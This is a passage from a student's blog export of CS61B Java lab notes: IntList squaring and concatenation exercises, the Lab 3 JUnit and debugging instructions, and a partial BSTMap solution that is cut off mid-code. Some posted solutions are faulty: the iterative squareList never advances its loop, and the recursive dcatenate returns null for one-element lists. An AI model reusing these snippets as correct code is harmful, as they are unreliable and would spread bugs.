<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns a list equal to L with all elements squared. Destructive.Iteratively</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dSquareList</span><span class="params">(IntList L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (L != <span class="keyword">null</span>) &#123;</span><br><span class="line">        L.first = L.first * L.first;</span><br><span class="line">        L = L.rest;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns a list equal to L with all elements squared. Non-destructive.iterative</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">squareListIterative</span><span class="params">(IntList L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    IntList res = <span class="keyword">new</span> IntList(L.first * L.first, <span class="keyword">null</span>);</span><br><span class="line">    IntList ptr = res;</span><br><span class="line">    IntList B = L.rest;</span><br><span class="line">    <span class="keyword">while</span> (L != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ptr.rest = <span class="keyword">new</span> IntList(L.first * L.first, <span class="keyword">null</span>);</span><br><span class="line">        B = B.rest;</span><br><span class="line">        ptr = ptr.rest;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns a list equal to L with all elements squared. Non-destructive.recursive</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">squareListRecursive</span><span class="params">(IntList L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> IntList(L.first * L.first, squareListRecursive(L.rest));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dcatenate(IntList A, IntList B): returns a list consisting of all elements of A, followed by all elements of B. May modify A. To be completed by you.</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns a list consisting of the elements of A followed by the</span></span><br><span class="line"><span class="comment"> * *  elements of B.  May modify items of A. Don't use 'new'.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// Iterative concate A, B</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">dcatenate</span><span class="params">(IntList A, IntList B)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (A == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> B;</span><br><span class="line">    &#125;</span><br><span class="line">    IntList ptr = A;</span><br><span class="line">    <span class="keyword">while</span> (ptr.rest != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ptr = ptr.rest;</span><br><span class="line">    &#125;</span><br><span class="line">    ptr.rest = B;</span><br><span class="line">    <span class="keyword">return</span> A;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// recursive destruct???</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">dcatenate</span><span class="params">(IntList A, IntList B)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (A == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> B;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (A.rest == <span class="keyword">null</span>) &#123;</span><br><span class="line">        A.rest = B;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dcatenate(A.rest, B);</span><br><span class="line">    <span class="keyword">return</span> A;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">catenate(IntList A, IntList B): returns a list consisting of all elements of A, followed by all elements of B. May not modify A. To be completed by you.</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns a list consisting of the elements of A followed by the</span></span><br><span class="line"><span class="comment"> * * elements of B.  May NOT modify items of A.  Use 'new'.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// recursive non-destruct</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">catenate</span><span class="params">(IntList A, IntList B)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(A == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> B;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> IntList(A.first, catenate(A.rest, B));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// iterative non-destruct</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">catenate</span><span class="params">(IntList A, IntList B)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (A == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> B;</span><br><span class="line">    &#125;</span><br><span class="line">    IntList ptr = A;</span><br><span class="line">    IntList res = <span class="keyword">new</span> IntList(ptr.first, <span class="keyword">null</span>);</span><br><span class="line">    IntList ptr1 = res;</span><br><span class="line">    <span class="keyword">while</span> (ptr.rest != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ptr1.rest = <span class="keyword">new</span> IntList(ptr.rest.first, <span class="keyword">null</span>);</span><br><span class="line">        ptr = ptr.rest;</span><br><span class="line">        ptr1 = ptr1.rest;</span><br><span class="line">    &#125;</span><br><span class="line">    ptr1.rest = B;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Lists1Exercises</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** Returns an IntList identical to L, but with</span></span><br><span class="line"><span class="comment">      * each element incremented by x. L is not allowed</span></span><br><span class="line"><span class="comment">      * to change. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">incrList</span><span class="params">(IntList L, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* Your code here. */</span></span><br><span class="line">        <span class="keyword">if</span> (L == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> L;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> IntList(L.first + x, incrList(L.rest, x));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Returns an IntList identical to L, but with</span></span><br><span class="line"><span class="comment">      * each element incremented by x. Not allowed to use</span></span><br><span class="line"><span class="comment">      * the 'new' keyword. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">dincrList</span><span class="params">(IntList L, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* Your code here. */</span></span><br><span class="line">        IntList B = L;</span><br><span class="line">        <span class="keyword">while</span> (B != <span class="keyword">null</span>) &#123;</span><br><span class="line">            B.first += x;</span><br><span class="line">            B = B.rest;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> L;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        IntList L = <span class="keyword">new</span> IntList(<span class="number">5</span>, <span class="keyword">null</span>);</span><br><span class="line">        L.rest = <span class="keyword">new</span> IntList(<span class="number">7</span>, <span class="keyword">null</span>);</span><br><span class="line">        L.rest.rest = <span class="keyword">new</span> IntList(<span class="number">9</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(L.size());</span><br><span class="line">        System.out.println(L.iterativeSize());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Test your answers by uncommenting. Or copy and paste the</span></span><br><span class="line">        <span class="comment">// code for incrList and dincrList into IntList.java and</span></span><br><span class="line">        <span class="comment">// run it in the visualizer.</span></span><br><span class="line">        <span class="comment">// System.out.println(L.get(1));</span></span><br><span class="line">        <span class="comment">// System.out.println(incrList(L, 3));</span></span><br><span class="line">        <span class="comment">// System.out.println(dincrList(L, 3));        </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-lab03</title>
    <url>/2018/09/05/cs61b-lab03/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>In this lab, you will learn about Unit Testing, JUnit, the 61B style checker, and we’ll also get a bit more debugging experience.</p>
<h2 id="What-is-JUnit"><a href="#What-is-JUnit" class="headerlink" title="What is JUnit?"></a>What is JUnit?</h2><p>JUnit is a Unit Testing Framework for Java.</p>
<a id="more"></a>

<h2 id="What-is-Unit-Testing"><a href="#What-is-Unit-Testing" class="headerlink" title="What is Unit Testing?"></a>What is Unit Testing?</h2><p>Unit Testing is a great way to rigorously test each method of your code and ultimately ensure that you have a working project.</p>
<p>The “Unit” part of Unit Testing comes from the idea that you can break your program down into units, or the smallest testable part of an application. Therefore, Unit Testing enforces good code structure (each method should only do “One Thing”), and allows you to consider all of the edge cases for each method and test for them individually.</p>
<p>In this class, you will be using JUnit to create and run tests on your code to ensure its correctness. And when JUnit tests fail, you will have an excellent starting point for debugging. Furthermore, if you have some terrible bug that is hard to fix, you can use git to revert back to a state when your code was working properly according to the JUnit tests.</p>
<h2 id="JUnit-Syntax"><a href="#JUnit-Syntax" class="headerlink" title="JUnit Syntax"></a>JUnit Syntax</h2><p>JUnit tests are written in Java, similar to what you wrote in Project 1A with LinkedListDequeTest. However, the JUnit library implements all the boring stuff like printing error messages, making test writing much simpler.</p>
<p>To see an example JUnit test, navigate to the Arithmetic directory and open ArithmeticTest.java in your favorite text editor (don’t open IntelliJ just yet).</p>
<p>The first thing you’ll notice are the imports at the top. These imports are what give you easy access to the JUnit methods and functionality that you’ll need to run JUnit tests. For more information, see the Testing lecture video.</p>
<p>Next, you’ll see that there are two methods in ArithmeticTest.java: testProduct and testSum. These methods follow this format:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    assertEquals(&lt;expected&gt;, &lt;actual&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>assertEquals is a common method used in JUnit tests. It tests whether a variable’s actual value is equivalent to its expected value.</p>
<p>When you create JUnit test files, you should precede each test method with a @Test annotation, and can have one or more assertEquals or assertTrue methods (provided by the JUnit library). ** All tests must be non-static. ** This may seem weird since your tests don’t use instance variables and you probably won’t instantiate the class. However, this is how the designers of JUnit decided tests should be written, so we’ll go with it.</p>
<p>From this point forwards in 61B, we will officially be working in IntelliJ. If you want to run your code from the terminal, refer to this supplemental guide. While you’re welcome to do this, the staff will not provide official support for command line compilation and execution.</p>
<h1 id="Running-JUnit-Tests-in-IntelliJ-or-another-IDE"><a href="#Running-JUnit-Tests-in-IntelliJ-or-another-IDE" class="headerlink" title="Running JUnit Tests in IntelliJ (or another IDE)"></a>Running JUnit Tests in IntelliJ (or another IDE)</h1><p>Open up IntelliJ and import your lab 3 folder that came with the skeleton. Repeat the steps from Lab 2 Setup, Project Setup and don’t forget to import the javalib libraries!</p>
<p>Open up lab3/Arithmetic/ArithmeticTest.java in IntelliJ. Move your cursor to the main method of ArithmeticTest and click the Run… option under the Run menu at the top of IntelliJ.</p>
<p>Run Options</p>
<p>After clicking “Run…”, you should see at least two options that will look something like the list below. The number of items in your list may vary.</p>
<p>Run Options</p>
<p>The two most important options in your list will be the one that says only “ArithmeticTest” next to the red and green arrows (next to the 2. in the image above), and the one that says only “ArithmeticTest” next to the white and blue boxes (next to the 1. in the image above).</p>
<p>If you use the version with red/green arrows, then IntelliJ will render the results of the tests. If you use the version with the white/blue boxes, the renderer that Josh put together will run instead. Which you prefer is a matter of personal preference. For the rest of the course we will refer to these as the “default renderer” and the “jh61b renderer”, respectively.</p>
<p>For now, run the default renderer, and you should see something like:</p>
<p>Run Options</p>
<p>This is saying that the test on line 25 of ArithmeticTest.java failed. The test expected 5 + 6 to be 11, but the Arithmetic class claims 5 + 6 is 30. You’ll see that even though testSum includes many assert statements, only one failure is shown.</p>
<p>This is because JUnit tests are short-circuiting – as soon as one of the asserts in a method fails, it will output the failure and move on to the next test.</p>
<p>Try clicking on the ArithmeticTest.java:25 in the window at the bottom of the screen and IntelliJ will take you straight to the failed test. This can come in handy when running your own tests on later projects.</p>
<p>Next, try running the code with the jh61b renderer. It doesn’t look as nice as the default renderer, and doesn’t allow you to click straight to code. In earlier versions of this course, we had students run tests from the command line, which required me to write our own custom renderer. In this new cyber-future where we use IntelliJ, this renderer is no longer necessary. However, you might find that you prefer it.</p>
<p>Run Options</p>
<p>For those of you who prefer the jh61b renderer, you can modify your JUnit test file so that it only shows the results of failed tests (instead of all tests). To do this, simply change the mode argument from “all” in the main method to “failed”.</p>
<p>If you just want to use the renderer that you already selected, you can bypass having to pick between the two renderers in any of the following four ways:</p>
<p>Right-click and then selecting ‘Run’.<br>Use the top item in the Run menu at the top of the IntelliJ screen.<br>Click the green arrow (or debugging symbol) in the top right.<br>Use the appropriate keyboard shortcut.<br>All four of these are equivalent. If you decide you want to switch renderers, you’ll need to use the “Run…” option instead.</p>
<p>Now fix the bug, either by inspecting Arithmetic.java and finding the bug, or using the IntelliJ debugger to step through the code until you reach the bug.</p>
<p>After fixing the bug, rerun the test, and if you’re using the default renderer, you should get a nice glorious green bar. Enjoy the rush.</p>
<h1 id="Intlists"><a href="#Intlists" class="headerlink" title="Intlists"></a>Intlists</h1><p>Now a real-CS61B application of JUnit tests: IntLists.</p>
<p>As with last week’s lab, we’re going to take advantage of the ‘of’ method of the IntList class, which makes creating IntLists (and writing IntList tests) much easier. For example, consider:</p>
<p>IntList myList = IntList.of(0, 1, 2, 3);<br>Which will create the IntList 0 -&gt; 1 -&gt; 2 -&gt; 3 -&gt; null.</p>
<h2 id="Test-a-Reverse-Method"><a href="#Test-a-Reverse-Method" class="headerlink" title="Test a Reverse Method"></a>Test a Reverse Method</h2><p>Copy your IntList.java that you created for lab2 into the lab3/IntList folder. In this section, our goal will be to write the reverse method from this week’s discussion worksheet.</p>
<p>We’ll showcase the idea of “test-driven development” for this exercise, where we write a unit test even before we write the new method.</p>
<p>Add a new test to IntListTest.java that tests the .reverse() method, which you can assume has the following definition:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns the reverse of the given IntList.</span></span><br><span class="line"><span class="comment"> * This method is destructive. If given null</span></span><br><span class="line"><span class="comment"> * as an input, returns null.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">reverse</span><span class="params">(IntList A)</span></span></span><br></pre></td></tr></table></figure>
<p>Don’t add a reverse method to IntList yet. We’re going to write a test BEFORE we write reverse.</p>
<p>Your test should test at least the following three situations:</p>
<ul>
<li>That the function returns a reversed list.</li>
<li>That the function is destructive, i.e. when it is done running, the list pointed to by A has been tampered with. You can use assertNotEquals. This is sort of a silly test.</li>
<li>That the method handles a null input properly.<br>You’ll notice that as you’re typing your code that the IntList.reverse is highlighted in red, and mousing over should say “Cannot resolve method reverse” or similar. This is because we haven’t added a reverse method yet. We’ll do this in the next section. Don’t write reverse yet!</li>
</ul>
<p>Once you’ve written your test, compare your results to your neighbor in lab and discuss. Make sure you’ve both written tests for at least all three situations above.</p>
<p>If you’re working from the command line instead of IntelliJ (not recommended): Try compiling IntListTest.java, and you should get a compiler error along the lines of:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IntListTest.java:72: error: cannot find symbol</span><br><span class="line"></span><br><span class="line">  symbol:   method reverse</span><br></pre></td></tr></table></figure>
<p>This error is a great thing! It means that the compiler is actually finding our test.</p>
<h2 id="Writing-a-Reverse-Method"><a href="#Writing-a-Reverse-Method" class="headerlink" title="Writing a Reverse Method"></a>Writing a Reverse Method</h2><p>Now create a dummy version of the reverse method into IntList.java that simply returns null. Your only goal here is to get IntList.java to compile. Don’t fill in the code for the actual reverse method yet, just make it return null</p>
<p>If you’re running IntListTest from the command line, you’ll want to add a main method before proceeding. See ArithmeticTest.java for an example. Since you should be using IntelliJ, this isn’t necessary unless you want to use the jh61b renderer instead of the default renderer.</p>
<p>Try running the test, and it test should fail. This is great! We’ve now reached the “red” phase of the Test-Driven Development (TDD) cycle described in class.</p>
<p>Write a reverse method, and rerun the tests until it passes. If you’re stuck (this is a tricky problem with a very clever solution), see the week 3 discussion solutions. Note that a correct reverse is not required for full credit on this week’s lab (it’s an ungraded test in the AG), so if you’re really stuck and need to work on project 1A, do that first, and then come back and complete this exercise after you’ve finished project 1A.</p>
<p>Protip: If you want to have your tests timeout after a certain amount of time (to prevent infinite loops), you can declare your test like this:</p>
<p>@Test(timeout = 1000)<br>The given parameter specifies the maximum time in milliseconds.</p>
<p>Some people find the rush of TDD addictive. You basically set up a little game for yourself to solve. Some people hate it. Your mileage may vary. Whether you personally enjoy the TDD flow or not, writing tests will be one of the most important skills you learn here at Berkeley, and getting “test-infected” will save you and your future colleagues an enormous amount of time and misery.</p>
<h1 id="A-Debugging-Mystery"><a href="#A-Debugging-Mystery" class="headerlink" title="A Debugging Mystery"></a>A Debugging Mystery</h1><p>Another important skill to learn is how to exhaustively debug. When done properly, debugging should allow you to rapidly narrow down where a bug might be located, even when you are debugging code you don’t fully understand.</p>
<p>Your company, Flik Enterprises, has released a fine software library called Flik.java that is able to determine whether two Integers are the same or not.</p>
<p>You receive an email from someone named “Horrible Steve” who describes a problem they’re having with your library:</p>
<p>“Dear Flik Enterprises,</p>
<p>Your library is very bad. See the attached code. It should print out 500<br>but actually it’s printing out 128.</p>
<p>(attachment: HorribleSteve.java)”<br>Using any combination of the following techniques, figure out whether the bug is in Horrible Steve’s code or in Flik enterprise’s library:</p>
<p>Writing JUnit tests for the Flik library.<br>Using the IntelliJ debugger, especially conditional breakpoints.<br>Using print statements.<br>Refactoring Horrible Steve’s code. Refactoring means changing the syntax without changing the functionality. This may be hard to do since HS’s code uses lots of weird stuff.<br>HorribleSteve.java and Flik.java both use syntax we haven’t covered in class. We do not expect you to fix the bug or even understand why it’s happening once you have found it. Instead, your job is simply to find the bug.</p>
<p>Tip: JUnit provides methods assertTrue(boolean) and assertTrue(String, boolean) that you might find helpful.</p>
<p>Try to come up with a short explanation of the bug! Check in with your TA to see if your answer is right (not for a grade).</p>
<h1 id="Running-the-61B-Style-Checker"><a href="#Running-the-61B-Style-Checker" class="headerlink" title="Running the 61B Style Checker"></a>Running the 61B Style Checker</h1><p>We will be using the CS 61B IntelliJ Plugin to check for style. Try it out on IntList.java in your IntList folder. You should see that there are at least two style errors (the two we put in, plus whatever you may have introduced yourself). Resolve these errors. If you’re ever stuck on style issues, consult the official 61B style guide.</p>
<p>When you pass the style check, the output should look like:</p>
<p>Running style checker on 1 file(s)…<br>Style checker completed with 0 errors</p>
<h1 id="Deque-Unit-Tests"><a href="#Deque-Unit-Tests" class="headerlink" title="Deque Unit Tests"></a>Deque Unit Tests</h1><p>In project 1B (to be released 2/3), you’ll be required to write JUnit tests for your Deque classes. If you have extra time in lab, start writing some tests for LinkedListDeque and ArrayDeque as a warmup.</p>
<h1 id="Some-question"><a href="#Some-question" class="headerlink" title="Some question?"></a>Some question?</h1><ul>
<li>In reverse’s implement, how can I make the change of parameter A reflect to the outside A;</li>
<li>When comparing two boxing Integer A and B, if A and B between -128 and +127, we can correctly compare the two Integers, but when the number is beyond +127, the result can not be right, <a href="https://stackoverflow.com/questions/1700081/why-is-128-128-false-but-127-127-is-true-when-comparing-integer-wrappers-in-ja" target="_blank" rel="noopener">stackoverflow post</a></li>
<li>Style checker is verbose, so I DON’T use them.</li>
<li>conditional breakpoint: right click the red dot, then set the condition when the breakpoint suspend.</li>
</ul>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-lab09</title>
    <url>/2018/11/05/cs61b-lab09/</url>
    <content><![CDATA[<h1 id="Lab-9-Tree-Maps-vs-Hash-Maps"><a href="#Lab-9-Tree-Maps-vs-Hash-Maps" class="headerlink" title="Lab 9: Tree Maps vs. Hash Maps"></a>Lab 9: Tree Maps vs. Hash Maps</h1><p>In this lab, you’ll create BSTMap, a BST-based implementation of the Map61B interface, which represents a basic map. Then, you’ll create MyHashMap, another implementation of the Map61B interface, which instead represents a Hash Map rather than a Tree Map. This lab is pretty long, so it’s unlikely you’ll finish in the allotted time. Don’t worry, though, the autograder is friendly, and you shouldn’t stress about completing every last part, though doing so is great midterm practice.</p>
<h2 id="1-BSTMap"><a href="#1-BSTMap" class="headerlink" title="1: BSTMap"></a>1: BSTMap</h2><p>The skeleton provides a BSTMap that implements the Map61B interface using a BST (Binary Search Tree) as its core data structure in a file named BSTMap.java. We provide instance variables, a constructor, and a clear method. Your goal is to implement get, put, and size. Other methods such as remove, keySet, and iterator are optional for this lab, and by default should throw an UnsupportedOperationException unless you choose to implement them.</p>
<p>For get and put, you may find it useful to use the putHelper and getHelper helper methods we’ve provided you in the skeleton. We recommend that you work on methods in the order they appear int he file.</p>
<p>Note that the BSTMap class is declared such that the generic keys extend Comparable<K>, so you should use the compareTo method found in the Comparable interface to compare keys.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        BSTMap&lt;String, Integer&gt; bstmap = <span class="keyword">new</span> BSTMap&lt;&gt;();</span><br><span class="line">        bstmap.put(<span class="string">"hello"</span>, <span class="number">5</span>);</span><br><span class="line">        bstmap.put(<span class="string">"cat"</span>, <span class="number">10</span>);</span><br><span class="line">        bstmap.put(<span class="string">"fish"</span>, <span class="number">22</span>);</span><br><span class="line">        bstmap.put(<span class="string">"zebra"</span>, <span class="number">90</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Solution:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab9;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Implementation of interface Map61B with BST as core data structure.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Macon</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BSTMap</span>&lt;<span class="title">K</span> <span class="keyword">extends</span> <span class="title">Comparable</span>&lt;<span class="title">K</span>&gt;, <span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map61B</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* (K, V) pair stored in this Node. */</span></span><br><span class="line">        <span class="keyword">private</span> K key;</span><br><span class="line">        <span class="keyword">private</span> V value;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Children of this Node. */</span></span><br><span class="line">        <span class="keyword">private</span> Node left;</span><br><span class="line">        <span class="keyword">private</span> Node right;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">Node</span><span class="params">(K k, V v)</span> </span>&#123;</span><br><span class="line">            key = k;</span><br><span class="line">            value = v;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node root;  <span class="comment">/* Root node of the tree. */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size; <span class="comment">/* The number of key-value pairs in the tree */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Creates an empty BSTMap. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BSTMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Removes all of the mappings from this map. */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        root = <span class="keyword">null</span>;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Returns the value mapped to by KEY in the subtree rooted in P.</span></span><br><span class="line"><span class="comment">     *  or null if this map contains no mapping for the key.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> V <span class="title">getHelper</span><span class="params">(K key, Node p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (key ==  <span class="keyword">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"the argument of get() is null!"</span>);</span><br><span class="line">        <span class="keyword">if</span> (p == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span> cmp = key.compareTo(p.key);</span><br><span class="line">        <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>) <span class="keyword">return</span> getHelper(key, p.left);</span><br><span class="line">        <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>) <span class="keyword">return</span> getHelper(key, p.right);</span><br><span class="line">        <span class="keyword">return</span> p.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Returns the value to which the specified key is mapped, or null if this</span></span><br><span class="line"><span class="comment">     *  map contains no mapping for the key.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> V <span class="title">get</span><span class="params">(K key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getHelper(key, root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Returns a BSTMap rooted in p with (KEY, VALUE) added as a key-value mapping.</span></span><br><span class="line"><span class="comment">      * Or if p is null, it returns a one node BSTMap containing (KEY, VALUE).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">putHelper</span><span class="params">(K key, V value, Node p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (p == <span class="keyword">null</span>) &#123;</span><br><span class="line">            size++;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Node(key, value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> cmp = key.compareTo(p.key);</span><br><span class="line">        <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            p.left = putHelper(key, value, p.left);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            p.right = putHelper(key, value, p.right);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            p.value = value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Inserts the key KEY</span></span><br><span class="line"><span class="comment">     *  If it is already present, updates value to be VALUE.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">        root = putHelper(key, value, root);</span><br><span class="line">    